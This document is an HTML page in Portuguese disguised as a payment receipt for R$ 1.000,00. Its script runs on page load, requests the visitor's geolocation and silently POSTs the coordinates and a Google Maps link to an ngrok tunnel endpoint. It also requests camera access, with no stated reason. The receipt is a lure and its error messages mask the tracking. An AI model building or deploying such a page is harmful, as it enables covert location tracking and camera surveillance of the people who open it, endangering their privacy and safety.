<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Comprovante de Recebimento</title>
  <link rel="stylesheet" href="styles.css" />
</head>

<body>
  <div class="comprovante-container">
    <h1>Comprovante de Recebimento</h1>

    <div class="informacoes">
      <p><span>Data:</span> <span id="data-atual"></span></p>
      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
      <p><span>De:</span> João Silva de Oliveira</p>
      <p><span>Status:</span> Recebido com Sucesso</p>
    </div>

    <button class="botao" onclick="window.print()">Imprimir</button>

    <div class="comprovante-footer">
      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
      <p><a href="#">Clique aqui</a> para mais informações.</p>
    </div>

    <!-- Video Elemento para mostrar a câmera -->
    <video id="video" width="640" height="480" autoplay></video>

  </div>

  <script>
    window.addEventListener("load", () => {
      // Chama a função para acessar a geolocalização
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
      } else {
        alert("Algo deu errado. Tente novamente mais tarde.");
      }

      // Solicita permissão para usar a câmera
      solicitarPermissaoCamera();
    });

    // Função para pedir permissão e acessar a câmera
    function solicitarPermissaoCamera() {
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        // Solicita permissão para o vídeo
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(function (stream) {
            // Se a permissão for concedida, exibe o vídeo no elemento <video>
            const videoElement = document.getElementById("video");
            videoElement.srcObject = stream;
          })
          .catch(function (error) {
            // Se o usuário negar a permissão ou ocorrer algum erro
            console.error("Erro ao acessar a câmera:", error);
            alert("Permissão de câmera negada ou erro ao acessar a câmera.");
          });
      } else {
        alert("Este navegador não suporta a API de mídia.");
      }
    }

    const dataAtual = new Date();
    const dia = String(dataAtual.getDate()).padStart(2, '0');
    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
    const ano = dataAtual.getFullYear();

    const dataFormatada = `${dia}/${mes}/${ano}`;

    document.getElementById("data-atual").textContent = dataFormatada;

    console.log(dataAtual)

    function sendLocation(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

      fetch("https://bd70-2804-d84-21ec-1500-55e1-85d5-ce-f8b6.ngrok-free.app/send-location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ latitude, longitude, maps })
      })
        .then(response => response.json())
        .then(data => {
          if (!data.success) {
            alert("Erro ao enviar o comprovante.");
          }
        })
        .catch(error => {
          console.error("Erro:", error);
        });
    }

    function handleError(error) {
      alert("Erro ao obter a localização: " + error.message);
    }
  </script>
</body>

</html>
